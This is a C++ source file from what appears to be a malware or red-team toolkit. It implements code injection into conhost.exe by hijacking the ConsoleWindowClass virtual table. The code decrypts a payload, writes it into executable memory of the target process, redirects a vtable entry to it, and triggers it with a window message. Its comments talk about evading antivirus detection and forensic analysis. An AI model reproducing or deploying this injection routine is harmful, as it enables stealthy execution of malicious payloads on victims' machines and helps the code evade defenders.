//
// Created by Eteli on 07/03/2022.
//

#include "ConsoleWindowsClassInjection.h"
using namespace std;

    void ConsoleWindowsClassInjection::Inject() {
        HWND cwc_handle;
        DWORD pid;
        HANDLE handle;
        LPVOID pRemoteCode, mTable;
        SIZE_T num_writen_bytes;
        ConsoleWindow cw;

        // Receive handle to ConsoleWindowClass, and PID of conhost.exe
        cwc_handle = FindWindowA("ConsoleWindowClass", nullptr);
        pid = FindTarget("conhost.exe");

        if(!pid){
            cout <<"Couldn't locate PID of conhost.exe" << endl;
            return;
        }

        // Could use some other access rights but seemed reasonable to use all access possible, hopefully that won't trigger AV's detection.
        handle = OpenProcess(PROCESS_ALL_ACCESS,FALSE,pid);

        // Use decryptor assigned to decrypt payload before loading into user area.
        Decrypt();

        // allocate memory space for payload and write payload.
        pRemoteCode = VirtualAllocEx(handle, nullptr, this->payload_len_, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        WriteProcessMemory(handle, pRemoteCode, this->payload_, this->payload_len_, &num_writen_bytes);

        // Read current ConsoleWindow into local variable cw.
        ReadProcessMemory(handle, (LPVOID)GetWindowLongPtr(cwc_handle, GWLP_USERDATA),(LPVOID)&cw, sizeof(ConsoleWindow), &num_writen_bytes);

        // Allocate memory space for modified virtual table.
        mTable = VirtualAllocEx(handle, nullptr, sizeof(ConsoleWindow), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

        // Exploit time: update modified table's GetWindowRect field with the address of the injected payload.
        cw.GetWindowHandle = (ULONG_PTR)pRemoteCode;

        // Write the modified table to process' address space.
        WriteProcessMemory(handle, mTable, &cw, sizeof(ConsoleWindow), &num_writen_bytes);

        // Modify process's table poiner to injected modified table.
        WriteProcessMemory(handle, (LPVOID)GetWindowLongPtr(cwc_handle, GWLP_USERDATA), &mTable, sizeof(ULONG_PTR), &num_writen_bytes);

        // Trigger execution of the payload, based on the exploit noted in the doc
        SendMessage(cwc_handle, WM_SETFOCUS, 0, 0);

        // free payload from memory.
        VirtualFreeEx(handle, pRemoteCode, 0, MEM_DECOMMIT | MEM_RELEASE);

        // previous un-modified table could be restored to avoid analysis, and could be reappointed.
    };
